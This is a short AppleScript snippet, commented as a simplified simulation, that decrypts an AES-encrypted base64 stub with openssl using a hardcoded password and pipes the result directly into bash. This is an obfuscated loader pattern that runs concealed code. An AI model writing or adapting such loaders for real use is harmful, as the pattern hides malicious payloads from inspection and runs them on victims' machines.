-- Simulates loading an AES-encrypted payload and decrypting it manually (simplified example)
set ciphertext to "Z4vh1EUXehZ3xUyz" -- encrypted (base64 stub)
set password to "hunter2"

-- Write decryptor to disk (could use Python or native OpenSSL)
do shell script "echo '" & ciphertext & "' | openssl enc -aes-256-cbc -a -d -pass pass:" & password & " | bash"
